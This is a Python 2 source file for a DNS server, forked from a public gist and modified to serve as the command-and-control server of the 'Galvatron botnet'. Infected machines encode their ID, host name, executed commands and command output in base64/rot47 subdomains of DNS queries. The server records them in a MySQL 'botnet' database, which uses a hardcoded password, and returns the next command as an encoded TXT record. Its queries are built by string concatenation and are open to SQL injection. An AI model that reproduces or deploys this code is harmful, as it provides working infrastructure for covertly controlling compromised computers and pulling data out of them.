#!/bin/python
#Forked from https://gist.github.com/andreif/6069838
# coding=utf-8
import datetime
import sys
import time
import threading
import traceback
import SocketServer
import os
import subprocess
import MySQLdb
import argparse
import base64
from dnslib import *

#########
# GLOBAL 
#####
#plan on moving these to sys.argv eventually
PORT=53
TTL = 60 * 5

def dns_response(data, client):
    request = DNSRecord.parse(data)
    reply = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)
    #debug test to see if we get the entire request (true)
    #req11= str(request).encode('hex')
    #req12=map(ord,req11.decode('hex'))
    #print req12
    #c2=""
    #for c in range (0,len(req12)):
	#print req12[c]
	#print c2
	#c2 = c2+str(chr(req12[c]))

   #Print the full request
   # print "\nc2:\n"+c2+"\n"
    qlen = len(request.questions)
    print ";; Total Questions: "+str(qlen)
    
#    for q in request.questions:
    qname = request.questions[0].qname
    qn = str(qname)
    print qn
    qtype = request.q.qtype
    qt = QTYPE[qtype]
    
    idu=''
    if "idu" in qn:
	#parse data
	subdomains= qn.split('.')
	for x in range(0,len(subdomains)):
		print str(x)+": "+subdomains[x]
	idu=subdomains[len(subdomains)-4]			
	pc=de64(subdomains[len(subdomains)-5])	
	timeX=10000#de64("10000")
	ipX=client
	comm=""
	output1=""
	if len(subdomains) > 5:	#we might have data :-)
		comm=de64(subdomains[len(subdomains)-7])		
		if qlen > 1:
			for q2 in range(0,(qlen-1)):
				qname2 = request.questions[q2].qname
				qn2 = str(qname2)
				subdom2 = qn2.split('.')	
				output1=output1 + de64(subdom2[len(subdom2)-6])		
		else:
			output1=de64(subdomains[len(subdomains)-6])			
	ts=int(time.time())

	print ";; PC: "+pc+", IDU: "+idu
	print ";; TIMESTAMP: "+str(ts)
	print ";; COMMAND:\n;; "+comm
	print ";; OUTPUT:\n;; "+output1
	db= MySQLdb.connect("localhost", "botnet","1qazXSW@","bot")
	cursor= db.cursor()

	item = db_exec(cursor,"SELECT id FROM bot WHERE idu='"+idu+"'")
	if item:
		print "Item:"+str(item[0])
		db_exec(cursor,"UPDATE bot SET ip='"+ipX+"', pc='"+pc+"', date='"+str(ts)+"', conn='dns' WHERE idu='"+idu+"'")
		if len(output1) > 0:		
			db_exec(cursor,"INSERT INTO output1 VALUES('', '"+idu+"', '"+str(ts)+"', '"+comm+"', '"+output1+"')")
	else:
		db_exec(cursor,"INSERT INTO bot VALUES('', '"+idu+"', '"+ipX+"', '"+pc+"', '"+str(ts)+"','stop', '"+str(timeX)+"','dns')")

	cmd = db_exec(cursor,"SELECT comando FROM bot WHERE idu='"+idu+"'")
	cmdX= en64(cmd[0]) 
	reply.add_answer(RR(rname=subdomains[len(subdomains)-5]+"."+idu+".idu.com",rtype=16,rclass=1,ttl=TTL,rdata=TXT(cmdX,)))
	if cmd[0].find("stop")==-1:
		db_exec(cursor,"UPDATE bot SET comando='stop' WHERE idu='"+idu+"'")
	print "---- Reply:\n", reply
        if cmd[0]:
	    print ";; Command: "+cmd[0]
	    print ";; Encoded Command: "+ cmdX
    return reply.pack()


class BaseRequestHandler(SocketServer.BaseRequestHandler):

    def get_data(self):
        raise NotImplementedError

    def send_data(self, data):
        raise NotImplementedError

    def handle(self):
        now = datetime.datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S.%f')
        print "\n\n%s request %s (%s %s):" % (self.__class__.__name__[:3], now, self.client_address[0],
                                               self.client_address[1])

	client = self.client_address[0]
        try:
            data = self.get_data()
            print len(data), data.encode('hex')  # repr(data).replace('\\x', '')[1:-1]
            self.send_data(dns_response(data, client))
        except Exception:
            traceback.print_exc(file=sys.stderr)


class TCPRequestHandler(BaseRequestHandler):

    def get_data(self):
        data = self.request.recv(8192).strip()
        sz = int(data[:2].encode('hex'), 16)
        if sz < len(data) - 2:
            raise Exception("Wrong size of TCP packet")
        elif sz > len(data) - 2:
            raise Exception("Too big TCP packet")
        return data[2:]

    def send_data(self, data):
        sz = hex(len(data))[2:].zfill(4).decode('hex')
        return self.request.sendall(sz + data)


class UDPRequestHandler(BaseRequestHandler):

    def get_data(self):
        return self.request[0].strip()

    def send_data(self, data):
        return self.request[1].sendto(data, self.client_address)

####
#Added by khr0x40sh for interoperability with the Galvatron botnet
###
def rot47(s):
    #https://rot47.net/_py/rot47.txt
    x = []
    for i in xrange(len(s)):
        j = ord(s[i])
        if j >= 33 and j <= 126:
            x.append(chr(33 + ((j + 14) % 94)))
        else:
            x.append(s[i])
    last= ''.join(x)
    #print last
    return last

def de64(instr):
	try:
	#	print "string:"+instr+"\n"
		instr=base64.b64decode(instr)
	#	print "de64:"+instr+"\n"
		return rot47(instr)
	except Exception, e:
    		print 'Failed to de64: '+ str(e)
		return "ERROR"

def en64(instr):
	instr = rot47(instr)
	return base64.b64encode(instr)

def db_exec(cursor,string):
	cursor.execute(string)
	back=cursor.fetchone()
	return back
#######

if __name__ == '__main__':
    print "Starting nameserver..."

    servers = [
        SocketServer.ThreadingUDPServer(('', PORT), UDPRequestHandler),
        SocketServer.ThreadingTCPServer(('', PORT), TCPRequestHandler),
    ]
    for s in servers:
        thread = threading.Thread(target=s.serve_forever)  # that thread will start one more thread for each request
        thread.daemon = True  # exit the server thread when the main thread terminates
        thread.start()
        print "%s server loop running in thread: %s" % (s.RequestHandlerClass.__name__[:3], thread.name)

    try:
        while 1:
            time.sleep(1)
            sys.stderr.flush()
            sys.stdout.flush()

    except KeyboardInterrupt:
        pass
    finally:
        for s in servers:
            s.shutdown()
